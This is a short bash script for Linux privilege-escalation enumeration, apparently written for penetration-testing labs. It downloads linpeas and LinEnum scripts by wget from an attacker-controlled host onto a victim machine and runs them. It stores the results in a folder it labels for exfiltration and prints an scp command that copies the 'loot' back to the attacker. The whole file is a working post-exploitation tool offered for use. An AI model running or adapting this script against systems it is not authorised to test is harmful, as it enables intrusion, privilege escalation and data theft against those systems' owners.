#!/bin/bash
# author: dead1
# script to quickly upload, run, and create offload
# for linux priv esc purposes

# on host (from folder containing enum scripts) 
# python3 -m http.server 80

# the variables
THE_HOST="192.168.119.144"	# your ip
THE_DIR="${PWD}/scans.out"	# folder created for scans/exfil
VIC_IP=`ifconfig | grep -A 1 'eth0' | tail -1 | cut -d ':' -f 2 | cut -d " " -f 1`

# colours
CL8='\033[1;31m' 	#light red
CL2='\033[0;32m' 	#green
NC='\033[0m' 		#No color
COL1="${CL2}[*]${NC}"

echo -e "${CL8}>>>${NC} Dead1's Linux PrivEsc Enumeration ${CL8}<<<${NC}"
echo -e "${COL1} Downloading Scripts from ${THE_HOST}"
wget -q ${THE_HOST}/lin-enum.py
echo -e "${COL1} lin-enum.py Downloaded!"
wget -q ${THE_HOST}/lin-enum.sh
echo -e "${COL1} lin-enum.sh Downloaded!"
wget -q ${THE_HOST}/linpeas.sh
echo -e "${COL1} linpeas.sh Downloaded!"
echo -e "${COL1} Setting Permissions."
chmod +x lin-enum.py
chmod +x lin-enum.sh
chmod +x linpeas.sh
echo -e "${COL1} Creating ${THE_DIR}"
mkdir ${THE_DIR}
echo -e "${COL1} Running linenum.sh [Thread 1]"
./lin-enum.sh > ${THE_DIR}/linenum-sh.out &
echo -e "${COL1} Running linenum.py [Thread 2]"
python lin-enum.py > ${THE_DIR}/linenum-py.out &
echo -e "${COL1} Running linpeas.sh [Current Thread]"
./linpeas.sh > ${THE_DIR}/linpeas.out
echo -e "${COL1} Complete!\n\nscp -r $USER@${VIC_IP}:${THE_DIR} ./loot\n${NC}"
